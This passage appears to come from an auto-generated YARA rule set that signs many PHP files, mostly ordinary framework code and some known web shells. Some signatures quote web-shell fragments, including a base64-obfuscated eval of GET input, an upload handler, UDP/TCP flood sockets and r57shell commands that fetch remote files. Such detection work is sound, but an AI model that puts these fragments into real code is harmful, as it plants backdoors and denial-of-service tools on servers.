      $x5 = "* Execute an XPath query and store the results in the QueryPath." fullword ascii
      $s6 = "* <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">" fullword ascii
      $s7 = "* @see http://technosophos.com For how-tos and examples." fullword ascii
      $s8 = "* This does not process iframes. Xinclude processing is dependent on the " fullword ascii
      $s9 = "* If you attempt to use unwrap on a root element, this will throw a QueryPathException." fullword ascii
      $s10 = "* @license http://opensource.org/licenses/lgpl-2.1.php The GNU Lesser GPL (LGPL) or an MIT-like license." fullword ascii
      $s11 = "* It does no processing of the markup (such as schema validation)." fullword ascii
      $s12 = "* This can be used to create Data URLs for injection into CSS, JavaScript, or other " fullword ascii
      $s13 = "*  - A stream or file handle: If this is given, the stream's contents will be encoded" fullword ascii
      $s14 = "*  - parser_flags: An OR-combined set of parser flags. The flags supported" fullword ascii
      $s15 = "* This differs from {@link html()} in that it processes (and produces)" fullword ascii
      $s16 = "// Could possibly use $m->firstChild http://theserverpages.com/php/manual/en/ref.dom.php" fullword ascii
      $s17 = "* XPath provides a finer-grained query language. Use this to execute" fullword ascii
      $s18 = "* The regular expression is run against the <i>text content</i> (the PCDATA) of the " fullword ascii
      $s19 = "* The function string will be executed as if it were the body of a " fullword ascii
      $s20 = "*  An exception is thrown if one attempts to unwrap a root element." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule position
{
   meta:
      description = "php22 - file position.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "043f7b2549af5e5eca70cd03b96dc76a82b79c135cc8fe43231889aedb3503c1"
   strings:
      $s1 = "<button class=\"btn btn-block btn-success begincrop\"><i class=\"fa fa-crop\"></i> <?= t('Crop Image') ?></button>" fullword ascii
      $s2 = "<button class=\"btn docrop btn-primary pull-right\"><?=t('Finalize Crop')?></button>" fullword ascii
      $s3 = "<label for=\"height\" class=\"control-label\"><?= t('Height') ?></label>" fullword ascii
      $s4 = "<label for=\"cropheight\" class=\"control-label\"><?= t('Height') ?></label>" fullword ascii
      $s5 = "<label for=\"cropwidth\" class=\"control-label\"><?= t('Width') ?></label>" fullword ascii
      $s6 = "<label for=\"width\" class=\"control-label\"><?= t('Width') ?></label>" fullword ascii
      $s7 = "<label for=\"scale\" class=\"control-label\"><?= t('Scale') ?></label>" fullword ascii
      $s8 = "<input class=\"form-control\" name=\"cropheight\" type=\"number\">" fullword ascii
      $s9 = "<button class=\"reset btn btn-default\"><?= t('Fit Image'); ?></button>" fullword ascii
      $s10 = "<input class=\"form-control\" name=\"cropwidth\" type=\"number\">" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 10KB and
      all of them
}

rule PayloadTest
{
   meta:
      description = "php22 - file PayloadTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bb9cf7463c81e38bd91e2b97641eba33c3022c718bf47bf471eda69549645433"
   strings:
      $x1 = "* It should throw an execption if a template is not found." fullword ascii
      $s2 = "$this->process->setCommandLine(Argument::containingString('bockfire \\'/boo/bar/php\\''))->shouldBeCalled();" fullword ascii
      $s3 = "* @expectedExceptionMessage Could not find script template" fullword ascii
      $s4 = "$this->process->setCommandLine(Argument::containingString('-dbar=foo'))->shouldBeCalled();" fullword ascii
      $s5 = "$this->process->setCommandLine(Argument::containingString('/foo/bar'))->shouldBeCalled();" fullword ascii
      $s6 = "$this->process->setCommandLine(Argument::containingString('-dfoo=bar'))->shouldBeCalled();" fullword ascii
      $s7 = "* It should pass PHP ini settings to the PHP executable." fullword ascii
      $s8 = "* It should generate a script from a given template, launch it" fullword ascii
      $s9 = "* It should allow the PHP executable to be wrapped with a different executable." fullword ascii
      $s10 = "* (c) Daniel Leech <daniel@dantleech.com>" fullword ascii
      $s11 = "$this->process->getOutput()->willReturn('{\"foo\": \"bar\"}');" fullword ascii
      $s12 = "private function validPayloadWithPhpConfig(array $phpConfig = [])" fullword ascii
      $s13 = "use Symfony\\Component\\Process\\Process;" fullword ascii
      $s14 = "* It should throw an exception if the script is invalid." fullword ascii
      $s15 = "return $this->validPayloadWithPhpConfig();" fullword ascii
      $s16 = "use PhpBench\\Benchmark\\Remote\\Payload;" fullword ascii
      $s17 = "$this->process->isSuccessful()->willReturn(true);" fullword ascii
      $s18 = "* @expectedExceptionMessage syntax error" fullword ascii
      $s19 = "private $process;" fullword ascii
      $s20 = "* It should customize the PHP binary path." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule phpThumb
{
   meta:
      description = "php22 - file phpThumb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4dc29d1d5a9d925ef257015eecd1ff9d369e054449f1d473251605712af9911f"
   strings:
      $x1 = "$phpThumb->ErrorImage('Usage: '.$_SERVER['PHP_SELF'].'?src=/path/and/filename.jpg'.\"\\n\".'read Usage comments for details');" fullword ascii
      $x2 = "$phpThumb->DebugMessage('$phpThumb->src ('.$phpThumb->src.') is remote image, attempting to download', __FILE__, __LINE__);" fullword ascii
      $x3 = "header('Content-Disposition: '.(@$_GET['down'] ? 'attachment' : 'inline').'; filename=\"'.$downloadfilename.'\"');" fullword ascii
      $s4 = "$phpThumb->DebugMessage('Setting \"user_agent\" to \"'.$phpThumb->config_http_user_agent.'\"', __FILE__, __LINE__);" fullword ascii
      $s5 = "$phpThumb->DebugMessage('setParameter('.$keyname.', '.$phpThumb->phpThumbDebugVarDump($value).')', __FILE__, __LINE__);" fullword ascii
      $s6 = "$phpThumb->DebugMessage('setParameter('.$key.', '.$phpThumb->phpThumbDebugVarDump($value).')', __FILE__, __LINE__);" fullword ascii
      $s7 = "$phpThumb->ErrorImage('Error in OutputThumbnail():'.\"\\n\".$phpThumb->debugmessages[(count($phpThumb->debugmessages) - 1)]);" fullword ascii
      $s8 = "$phpThumb->ErrorImage('ERROR: strlen($PHPTHUMB_CONFIG[high_security_password]) < 5');" fullword ascii
      $s9 = "$phpThumb->ErrorImage('Headers already sent ('.basename(__FILE__).' line '.__LINE__.')');" fullword ascii
      $s10 = "$phpThumb->ErrorImage('Please rename \"phpThumb.config.php.default\" to \"phpThumb.config.php\"');" fullword ascii
      $s11 = "if ($PHPTHUMB_DEFAULTS_GETSTRINGOVERRIDE || !isset($_GET[$key])) {" fullword ascii
      $s12 = "if ($contentType = phpthumb_functions::ImageTypeToMIMEtype(@$phpThumb->getimagesizeinfo[2])) {" fullword ascii
      $s13 = "//if (!@$_GET['phpThumbDebug'] && !is_file($phpThumb->sourceFilename) && !phpthumb_functions::gd_version()) {" fullword ascii
      $s14 = "ini_set('user_agent', $phpThumb->config_http_user_agent);" fullword ascii
      $s15 = "// this script relies on the superglobal arrays, fake it here for old PHP versions" fullword ascii
      $s16 = "gesizeinfo[0].'\"x\"'.$phpThumb->getimagesizeinfo[1].'\" to \"'.@$_GET['w'].'\"x\"'.@$_GET['h'].'\")', __FILE__, __LINE__);" fullword ascii
      $s17 = "if (!@$PHPTHUMB_CONFIG['cache_force_passthru'] && ereg('^'.preg_quote($nice_docroot).'(.*)$', $nice_cachefile, $matches)) {" fullword ascii
      $s18 = "header('Content-Type: '.phpthumb_functions::ImageTypeToMIMEtype($getimagesize[2]));" fullword ascii
      $s19 = "// base64-encoded error image in GIF format" fullword ascii
      $s20 = "n\".'If you really must do it this way, enable \"allow_local_http_src\" in phpThumb.config.php');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule OrderedTrait
{
   meta:
      description = "php22 - file OrderedTrait.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffbd700d9f7cd64ce916660c9e24b4c2867f7119d0713407cfd56e0ad9757330"
   strings:
      $s1 = "* @author Junior Grossi <juniorgro@gmail.com>" fullword ascii
      $s2 = "* @package Corcel\\Traits" fullword ascii
      $s3 = "namespace App\\Modules\\Content\\Traits;" fullword ascii
      $s4 = "* Trait OrderedTrait" fullword ascii
      $s5 = "* @return Builder" fullword ascii
      $s6 = "* @param Builder $query" fullword ascii
      $s7 = "return $query->orderBy(static::CREATED_AT, 'asc');" fullword ascii
      $s8 = "return $query->orderBy(static::CREATED_AT, 'desc');" fullword ascii
      $s9 = "public function scopeOldest(Builder $query)" fullword ascii
      $s10 = "public function scopeNewest(Builder $query)" fullword ascii
      $s11 = "use Nova\\Database\\ORM\\Builder;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule php22_qiang8
{
   meta:
      description = "php22 - file qiang8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "309ca500ab67a7ee174d80007a535a078b8422a4bd78fc9317c474dbbbe01590"
   strings:
      $s1 = "$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_shell_call_user_func
{
   meta:
      description = "php22 - file php-shell-call_user_func.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cd25ee6bb68446606564a78d327c6b5f388919a1462b8b61666fbe898aa04589"
   strings:
      $s1 = "$a = str_replace('x_','',base64_decode('eF9heF9zeF9zeF9leF9yeF90'));" fullword ascii
      $s2 = "$a = '_GET';" fullword ascii
      $s3 = "call_user_func($a,'$code=function() { '.$b['code'].'}');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PasswordConfirm
{
   meta:
      description = "php22 - file PasswordConfirm.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0a4919a4ccddbd8793dc4ce41261c4f553c9de7ec7293b7e6f000f8a521e7128"
   strings:
      $s1 = "$error_message = apply_filters( 'ninja_forms_password_confirm_mismatch', $error_message );" fullword ascii
      $s2 = "if( ! is_array( $password_fields ) || empty( $password_fields ) ) return $errors;" fullword ascii
      $s3 = "private function get_password_fields( $data )" fullword ascii
      $s4 = "$password_fields = $this->get_password_fields( $data );" fullword ascii
      $s5 = "$error_message = __( 'Passwords do not match', 'ninja-forms' );" fullword ascii
      $s6 = "$this->_settings[ 'confirm_field' ][ 'value' ] = __( 'password', 'ninja-forms' );" fullword ascii
      $s7 = "$this->_nicename = __( 'Password Confirm', 'ninja-forms' );" fullword ascii
      $s8 = "$this->_settings[ 'confirm_field' ][ 'field_types' ] = array( 'password' );" fullword ascii
      $s9 = "* Class NF_Fields_PasswordConfirm" fullword ascii
      $s10 = "if( $this->is_matching_values( $field, $password_field ) ) continue;" fullword ascii
      $s11 = "protected $_nicename = 'Password Confirm';" fullword ascii
      $s12 = "private function get_error_message()" fullword ascii
      $s13 = "if( 'password' != $field[ 'type' ] ) continue;" fullword ascii
      $s14 = "foreach( $password_fields as $password_field ){" fullword ascii
      $s15 = "protected $_name = 'passwordconfirm';" fullword ascii
      $s16 = "protected $_type = 'passwordconfirm';" fullword ascii
      $s17 = "$errors[] = $this->get_error_message();" fullword ascii
      $s18 = "$password_fields = array();" fullword ascii
      $s19 = "$password_fields[] = $field;" fullword ascii
      $s20 = "class NF_Fields_PasswordConfirm extends NF_Fields_Password" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule RequestsMonitorMiddleware
{
   meta:
      description = "php22 - file RequestsMonitorMiddleware.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "72e8adab6345ab175e0fb948beedd0c7401524e3357234632cb7c25fe242a467"
   strings:
      $s1 = "* @author  Mahmoud Zalt  <mahmoud@zalt.me>" fullword ascii
      $s2 = "use App\\Containers\\Debugger\\Values\\RequestsLogger;" fullword ascii
      $s3 = "* @param \\Illuminate\\Http\\Request $request" fullword ascii
      $s4 = "(new RequestsLogger())->releaseOutput($output);" fullword ascii
      $s5 = "$output->header(\"USER INFO\");" fullword ascii
      $s6 = "$output->header(\"REQUEST DATA\");" fullword ascii
      $s7 = "$output->header(\"RESPONSE DATA\");" fullword ascii
      $s8 = "$output->header(\"REQUEST INFO\");" fullword ascii
      $s9 = "* Class RequestsMonitorMiddleware" fullword ascii
      $s10 = "* @param \\Closure                 $next" fullword ascii
      $s11 = "public function handle(Request $request, Closure $next)" fullword ascii
      $s12 = "use Illuminate\\Http\\Request;" fullword ascii
      $s13 = "use App\\Ship\\Parents\\Middlewares\\Middleware;" fullword ascii
      $s14 = "namespace App\\Containers\\Debugger\\Middlewares;" fullword ascii
      $s15 = "$output->version();" fullword ascii
      $s16 = "$output->userInfo();" fullword ascii
      $s17 = "use App\\Containers\\Debugger\\Values\\Output;" fullword ascii
      $s18 = "$output = new Output($request, $response);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule ProductOptionValueTranslation
{
   meta:
      description = "php22 - file ProductOptionValueTranslation.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "107afdf0e36ce6b0ed9d7dac5ce0bc1d7fbcd481c6029613e9ff16b456f64629"
   strings:
      $s1 = "class ProductOptionValueTranslation extends AbstractTranslation implements ProductOptionValueTranslationInterface" fullword ascii
      $s2 = "use Sylius\\Component\\Resource\\Model\\AbstractTranslation;" fullword ascii
      $s3 = "public function getValue(): ?string" fullword ascii
      $s4 = "namespace Sylius\\Component\\Product\\Model;" fullword ascii
      $s5 = "public function setValue(?string $value): void" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule OptionalReRunner
{
   meta:
      description = "php22 - file OptionalReRunner.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bf56d833937bf6e1f8ede64a28ec448496d9da33ee9129f82fe7cdcb3142b97d"
   strings:
      $s1 = "* (c) Marcello Duarte <marcello.duarte@gmail.com>" fullword ascii
      $s2 = "* (c) Konstantin Kudryashov <ever.zet@gmail.com>" fullword ascii
      $s3 = "namespace PhpSpec\\Process\\ReRunner;" fullword ascii
      $s4 = "* This file is part of PhpSpec, A php toolset to drive emergent" fullword ascii
      $s5 = "use PhpSpec\\Process\\ReRunner;" fullword ascii
      $s6 = "public function __construct(ReRunner $decoratedRerunner, ConsoleIO $io)" fullword ascii
      $s7 = "* @var ConsoleIO" fullword ascii
      $s8 = "* @var ReRunner" fullword ascii
      $s9 = "* @param ConsoleIO $io" fullword ascii
      $s10 = "private $decoratedRerunner;" fullword ascii
      $s11 = "$this->decoratedRerunner = $decoratedRerunner;" fullword ascii
      $s12 = "$this->decoratedRerunner->reRunSuite();" fullword ascii
      $s13 = "* design by specification." fullword ascii
      $s14 = "if ($this->io->isRerunEnabled()) {" fullword ascii
      $s15 = "public function reRunSuite()" fullword ascii
      $s16 = "final class OptionalReRunner implements ReRunner" fullword ascii
      $s17 = "private $io;" fullword ascii
      $s18 = "use PhpSpec\\Console\\ConsoleIO;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule OrderStageLeafEvent
{
   meta:
      description = "php22 - file OrderStageLeafEvent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e10a4adb67d8b7849e7d873e438adb0b0b8781dfc995750f466bde3bac1f25d8"
   strings:
      $s1 = "* @return array Array of event data that will be passed though application or through js" fullword ascii
      $s2 = "public function setStatus($status = false)" fullword ascii
      $s3 = "use app\\modules\\core\\events\\SpecialEvent;" fullword ascii
      $s4 = "$this->status = boolval($status);" fullword ascii
      $s5 = "namespace app\\modules\\shop\\events;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule require_config_js
{
   meta:
      description = "php22 - file require_config.js.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fa3c526b0a87a3ca775227fe7323bfdcb7d62f1aa46b69edc0ef58ec6f759c7e"
   strings:
      $s1 = "$amdConfig = _elgg_services()->amdConfig->getConfig();" fullword ascii
      $s2 = "// Note we don't process the require() queue yet because it may require('elgg')" fullword ascii
      $s3 = "// Require is currently an Elgg shim. Convert it to a RequireJS config" fullword ascii
      $s4 = "require = <?php echo json_encode($amdConfig, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES); ?>;" fullword ascii
      $s5 = "// and we have to load that synchronously a little later" fullword ascii
      $s6 = "unset($amdConfig['deps']);" fullword ascii
      $s7 = "// <script>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule RefreshCommand
{
   meta:
      description = "php22 - file RefreshCommand.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e8ab714095e22cabffb53bb3094288c60251863ce9ec643989413aa7a2e62d07"
   strings:
      $x1 = "* Execute the console command." fullword ascii
      $s2 = "* The console command description." fullword ascii
      $s3 = "* Get the console command options." fullword ascii
      $s4 = "* Get the console command arguments." fullword ascii
      $s5 = "* Create a new command instance." fullword ascii
      $s6 = "* The console command name." fullword ascii
      $s7 = "* @param ImageRefreshService $imageRefreshService" fullword ascii
      $s8 = "* The image refresh service that will be used to" fullword ascii
      $s9 = "namespace Codesleeve\\LaravelStapler\\Commands;" fullword ascii
      $s10 = "protected $description = 'Regenerate images for a given model (and optional attachment and styles)';" fullword ascii
      $s11 = "* @var ImageRefreshService" fullword ascii
      $s12 = "['attachments', null, InputOption::VALUE_OPTIONAL, 'A list of specific attachments to refresh images on.']," fullword ascii
      $s13 = "use Illuminate\\Console\\Command;" fullword ascii
      $s14 = "use Codesleeve\\LaravelStapler\\Services\\ImageRefreshService;" fullword ascii
      $s15 = "public function __construct(ImageRefreshService $imageRefreshService)" fullword ascii
      $s16 = "class RefreshCommand extends Command" fullword ascii
      $s17 = "* rebuild images." fullword ascii
      $s18 = "$this->imageRefreshService->setOutput($this->output);" fullword ascii
      $s19 = "$this->imageRefreshService = $imageRefreshService;" fullword ascii
      $s20 = "protected function getArguments()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule ProxyLoginForAdminWebClient_v1_public
{
   meta:
      description = "php22 - file ProxyLoginForAdminWebClient.v1.public.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5b61a78c293416cc4424e28f366be61cb16ee85a710083578d9a85a793357da9"
   strings:
      $x1 = "* @api                {post} /v1/clients/web/admin/login Login (Password Grant with proxy)" fullword ascii
      $x2 = "* @apiDescription     Login Users using their email and password, without client_id and client_secret." fullword ascii
      $s3 = "* @apiName            ClientAdminWebAppLoginProxy" fullword ascii
      $s4 = "$router->post('clients/web/admin/login', [" fullword ascii
      $s5 = "'uses'  => 'Controller@proxyLoginForAdminWebClient'," fullword ascii
      $s6 = "* @apiParam           {String}  password user password" fullword ascii
      $s7 = "'as' => 'api_authentication_client_admin_web_app_login_proxy'," fullword ascii
      $s8 = "* HTTP/1.1 200 OK" fullword ascii
      $s9 = "* @apiParam           {String}  email user email" fullword ascii
      $s10 = "* @apiSuccessExample  {json}       Success-Response:" fullword ascii
      $s11 = "* @apiVersion         1.0.0" fullword ascii
      $s12 = "* @apiGroup           OAuth2" fullword ascii
      $s13 = "\"token_type\": \"Bearer\"," fullword ascii
      $s14 = "\"refresh_token\": \"ZFDPA1S7H8Wydjkjl+xt+hPGWTagX...\"" fullword ascii
      $s15 = "\"access_token\": \"eyJ0eXAiOiJKV1QiLCJhbG...\"," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule ProfileController
{
   meta:
      description = "php22 - file ProfileController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c3d44559ca5420a1d2a46b82464c1073f10f869144b1c9a220ea28832eedb0e4"
   strings:
      $s1 = "use Modules\\User\\Http\\Requests\\UpdateProfileRequest;" fullword ascii
      $s2 = "* @var UserRepository" fullword ascii
      $s3 = "namespace Modules\\User\\Http\\Controllers\\Api;" fullword ascii
      $s4 = "use Modules\\User\\Transformers\\UserProfileTransformer;" fullword ascii
      $s5 = "use Modules\\User\\Repositories\\UserRepository;" fullword ascii
      $s6 = "return new UserProfileTransformer($this->auth->user());" fullword ascii
      $s7 = "* @var Authentication" fullword ascii
      $s8 = "'message' => trans('user::messages.profile updated')," fullword ascii
      $s9 = "$this->user->update($user, $request->all());" fullword ascii
      $s10 = "public function __construct(Authentication $auth, UserRepository $user)" fullword ascii
      $s11 = "public function findCurrentUser()" fullword ascii
      $s12 = "private $auth;" fullword ascii
      $s13 = "public function update(UpdateProfileRequest $request)" fullword ascii
      $s14 = "$user = $this->auth->user();" fullword ascii
      $s15 = "'errors' => false," fullword ascii
      $s16 = "$this->auth = $auth;" fullword ascii
      $s17 = "use Illuminate\\Routing\\Controller;" fullword ascii
      $s18 = "use Modules\\User\\Contracts\\Authentication;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php22_Piwik
{
   meta:
      description = "php22 - file Piwik.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a2669365f3bd1384c2aeca84a62a4db306947f215da33697ae6cf513dd6a6384"
   strings:
      $s1 = "if (!$this->config->isConfigured() || empty($this->config->getReportToken())) {" fullword ascii
      $s2 = "* @var LoggerInterface" fullword ascii
      $s3 = "$piwikSiteId = $this->config->getPiwikSiteId($siteId->getConfigKey());" fullword ascii
      $s4 = "$this->logger->debug('Fetching Piwik visitor profile for ID {visitorId}', [" fullword ascii
      $s5 = "$this->startStopwatch('Targeting:piwikData', 'targeting');" fullword ascii
      $s6 = "$this->logger->error($e);" fullword ascii
      $s7 = "$this->stopStopwatch('Targeting:piwikData');" fullword ascii
      $s8 = "use Pimcore\\Targeting\\Model\\VisitorInfo;" fullword ascii
      $s9 = "namespace Pimcore\\Targeting\\DataProvider;" fullword ascii
      $s10 = "* @var Config" fullword ascii
      $s11 = "use Psr\\Log\\LoggerInterface;" fullword ascii
      $s12 = "// no visitor ID - nothing to fetch" fullword ascii
      $s13 = "LoggerInterface $logger" fullword ascii
      $s14 = "return $this->visitorClient->getVisitorProfile(" fullword ascii
      $s15 = "'visitorId' => $visitorInfo->getVisitorId()" fullword ascii
      $s16 = "$siteId      = $this->siteIdProvider->getForRequest($visitorInfo->getRequest());" fullword ascii
      $s17 = "* @var SiteIdProvider" fullword ascii
      $s18 = "* @var VisitorClient" fullword ascii
      $s19 = "$this->logger         = $logger;" fullword ascii
      $s20 = "private function loadData(VisitorInfo $visitorInfo)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule PropertyAsset
{
   meta:
      description = "php22 - file PropertyAsset.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "73771a85f9bca9eda78b25037a72b3bee2117ee2d09b3cd93ae9a9e9f86a2d58"
   strings:
      $s1 = "public $sourcePath = '@app/backend/assets/backend';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_dos_webshell
{
   meta:
      description = "php22 - file php_dos_webshell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8bbf62f78bfdc4a54ce841687a78e44ea228dd49b80f22cd3c527c0344d88512"
   strings:
      $x1 = "youtubea[10] = \"<iframe src=\\\"https://youtube.com/embed/oKpPd2hDrE4?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x2 = "youtubea[5] = \"<iframe src=\\\"https://youtube.com/embed/DC9xwwmyS70?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x3 = "youtubea[0] = \"<iframe src=\\\"https://youtube.com/embed/zeIjmvZZ_SQ?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x4 = "youtubea[6] = \"<iframe src=\\\"https://youtube.com/embed/liYyEqlvG1Y?autoplay=1#t=17s\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x5 = "youtubea[4] = \"<iframe src=\\\"https://youtube.com/embed/UDzNq1s7dAE?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x6 = "youtubea[13] = \"<iframe src=\\\"https://youtube.com/embed/xLho8rMQpoI?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x7 = "youtubea[12] = \"<iframe src=\\\"https://youtube.com/embed/nuno2jOwOjo?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x8 = "youtubea[3] = \"<iframe src=\\\"https://youtube.com/embed/GqUN76-_Djg?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x9 = "youtubea[7] = \"<iframe src=\\\"https://youtube.com/embed/K1VLaXoRRdk?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x10 = "youtubea[2] = \"<iframe src=\\\"https://youtube.com/embed/w1bRniqs774?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x11 = "youtubea[11] = \"<iframe src=\\\"https://youtube.com/embed/3Rd0LHQHjWg?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x12 = "youtubea[1] = \"<iframe src=\\\"https://youtube.com/embed/-ieJtn73e1w?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x13 = "youtubea[9] = \"<iframe src=\\\"https://youtube.com/embed/JRwXku3nM1c?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $x14 = "youtubea[8] = \"<iframe src=\\\"https://youtube.com/embed/EZxeJV-G9kg?autoplay=1\\\" frameborder=\\\"0\\\"></iframe>\"; " fullword ascii
      $s15 = "<title>&nbsp;Private Denial-of-Service Shell | Created by ASDA | HackForums.net | </title> " fullword ascii
      $s16 = "<script type=\"text/javascript\" src=\"//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js\"></script> " fullword ascii
      $s17 = "* lower ths to be secretive about the shell being on " fullword ascii
      $s18 = "setInterval(function(){title = title.substring(1, title.length) + title.substring(0, 1);document.title = title;}, 300); " fullword ascii
      $s19 = "$sock = @fsockopen(\"tcp://{$_GET['ip']}\", $_GET['port'], $errno, $errstr, 10); " fullword ascii
      $s20 = "$sock = @fsockopen(\"udp://{$_GET['ip']}\", $_GET['port'], $errno, $errstr, 10); " fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 30KB and
      1 of ($x*) and all of them
}

rule php22_r57_iFX
{
   meta:
      description = "php22 - file r57_iFX.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
   strings:
      $x1 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $x2 = "<title>:: The r57 shell with modified by iFX :: listening L\\'Arc~en~Ciel - MilkyWay::</title>" fullword ascii
      $x3 = "$_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s4 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????" fullword ascii
      $s5 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s6 = "exit(\"<b><a href=http://lintah-club.ueuo.com>HELLW access denied tau'!!!, soryy neeh cuy!! :D</a> : Access Denied</b>\");" fullword ascii
      $s7 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s8 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s9 = "ASES;\\nSELECT * FROM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\";" fullword ascii
      $s10 = "echo sr(40,\"<b>\".$lang[$language.'_text24'].$arrow.\"</b>\",in('text','remote_host',15,'jade.va.us.dal.net'));" fullword ascii
      $s11 = "@readfile (\"http://rst.void.ru/r57shell_version/version.php?version=\".$current_version.\"\");}}" fullword ascii
      $s12 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s13 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s14 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s15 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s16 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333" fullword ascii
      $s17 = "if(rmdir($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><" fullword ascii
      $s18 = "echo sr(45,\"<b>\".$lang[$language.'_text84'].$arrow.\"</b>\".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),\"\");" fullword ascii
      $s19 = "/* else { if(($rows = @mssql_affected_rows($db)) > 0) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>affecte" fullword ascii
      $s20 = "if($error) { echo \"<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>\".$error.\"</b></font></td></tr></table>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule OpenType
{
   meta:
      description = "php22 - file OpenType.php"
      author = "WatcherLab"
      date = "2019-02-23"
